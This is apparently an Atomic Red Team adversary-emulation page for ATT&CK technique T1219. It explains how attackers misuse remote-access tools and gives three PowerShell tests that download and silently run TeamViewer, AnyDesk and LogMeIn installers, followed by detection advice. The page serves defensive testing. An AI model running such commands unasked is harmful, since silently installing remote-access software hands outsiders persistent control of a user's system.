# T1219 - Remote Access Software
An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)

Remote access tools may be established and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.

Admin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns. (Citation: CrowdStrike 2015 Global Threat Report) (Citation: CrySyS Blog TeamSpy)

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - TeamViewer Files Detected Test on Windows
An adversary may attempt to trick the user into downloading teamviewer and using this to maintain access to the machine. Download of TeamViewer installer will be at the destination location when sucessfully executed.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe
$file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"
Start-Process $file1 /S;
Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'
```

Invoke-AtomicTest T1219 -TestNumbers 1

### Atomic Test #2 - AnyDesk Files Detected Test on Windows
An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe
$file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"
Start-Process $file1 /S;
```

Invoke-AtomicTest T1219 -TestNumbers 2

### Atomic Test #3 - LogMeIn Files Detected Test on Windows
An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
$file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
Start-Process $file1 /S;
Start-Process 'C:\Program Files (x86)\LogMeInIgnition\LMIIgnition.exe' "/S"
```

Invoke-AtomicTest T1219 -TestNumbers 3

## Detection
Monitor for applications and processes related to remote admin tools. Correlate activity with other suspicious behavior that may reduce false positives if these tools are used by legitimate users and administrators.

Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.

[Domain Fronting](https://attack.mitre.org/techniques/T1090/004) may be used in conjunction to avoid defenses. Adversaries will likely need to deploy and/or install these remote tools to compromised systems. It may be possible to detect or prevent the installation of these tools with host-based solutions.